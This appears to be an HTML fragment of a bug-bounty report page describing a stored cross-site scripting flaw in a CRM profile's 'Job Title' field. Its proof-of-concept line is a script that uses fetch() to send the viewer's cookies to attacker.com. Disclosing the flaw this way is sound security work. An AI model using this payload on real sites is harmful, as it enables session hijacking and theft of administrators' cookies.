<div class="col-12">
  <div class="row align-items-center mb-4">
    <div class="col">
      <h2 class="h5 page-title"><small class="text-muted">Report Detail</small><br />#BB-902: Stored XSS in CRM User Profile</h2>
    </div>
    <div class="col-auto">
      <span class="badge badge-pill badge-danger mr-2">CVSS 8.2</span>
      <button type="button" class="btn btn-outline-primary">Message Researcher</button>
    </div>
  </div>
  <div class="card shadow mb-4">
    <div class="card-body p-5">
      <h4 class="mb-3">Vulnerability Description</h4>
      <p class="text-muted">An attacker can inject a malicious script into the 'Job Title' field of their profile. When a CRM admin views the profile, the script executes in the admin context, potentially leading to session hijacking.</p>

      <h5 class="mt-4">Proof of Concept</h5>
      <div class="card bg-dark text-success p-3 mb-4">
        <code>&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie);&lt;/script&gt;</code>
      </div>

      <h5 class="mt-4">Internal Impact Audit</h5>
      <ul class="list-unstyled">
        <li><i class="fe fe-check-circle text-success mr-2"></i> PII Access: <strong>Yes</strong></li>
        <li><i class="fe fe-check-circle text-success mr-2"></i> Privilege Escalation: <strong>No</strong></li>
      </ul>
    </div>
  </div>
</div>